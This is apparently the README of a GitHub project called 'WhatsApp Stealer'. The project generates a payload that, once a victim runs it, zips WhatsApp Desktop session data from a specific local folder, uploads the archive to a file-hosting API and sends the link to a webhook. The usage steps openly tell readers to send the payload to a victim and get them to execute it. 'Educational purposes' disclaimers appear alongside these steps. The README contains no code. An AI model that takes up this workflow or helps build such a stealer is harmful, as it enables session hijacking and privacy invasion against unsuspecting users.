<a id="top"></a>
<h1 align="center">
  <br>
  <a href="https://github.com/xpierroz/WhatsappStealer"><img src="assets/home.png" alt="R"></a>
  <a href="https://github.com/xpierroz/WhatsappStealer"><img src="assets/whatsapp.png" width="150" alt="R"></a>
  <br>
  <br>
 Whatsapp Stealer
  <br>
</h1>

<div align="center">
    <br>
    <b>
        Steal people Whatsapp Session information 
    </b>
</div>

## WhatsApp Stealer 🪖

This program steal the victim's WhatsApp data such as profil pictures of conversations and stuff
Actually except that I don't really know how to use the other data but this is still interesting and this could be investigated later

## How to use 📖

* Download this repository
* Make sure you have python and the requirements installed (pip install -r requirements.txt)
* Start main.py 
* Create a payload (the program will ask you if you wanna compile the payload)
* Send the payload to your victim and make it execute it
* Don't forget this is a POC and that this shouldn't be used for malicious purposes, i'm not responsible for your actions

## How it works 🤔

The victim's payload will actually make a zip of all the WhatsApp data located at `LOCALAPPDATA\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm` 
Then, it's gonna uplaod it to the gofile API and send to the webhook the link

This is for educational purposes only, use at your own risk, I am not responsible for any of your actions!
This project is licensed under the <a href="https://mit-license.org/.">MIT License</a>

<p align="center"><a href=#top>Back to Top</a></p>